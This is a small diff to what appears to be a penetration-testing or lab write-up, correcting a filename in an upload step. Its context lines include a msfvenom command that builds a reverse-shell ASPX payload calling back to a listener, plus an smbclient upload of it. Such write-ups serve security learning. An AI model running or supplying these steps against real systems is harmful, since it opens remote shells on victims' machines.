@@ -205,7 +205,7 @@ Create reverse shell via msfvenom:
 ```bash
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.144.226 LPORT=4444 -f aspx -o shell.aspx
 ```
-Then move shell.exe -> smbclient:
+Then move shell.aspx -> smbclient:
 
 ```powershell
 > put shell.aspx
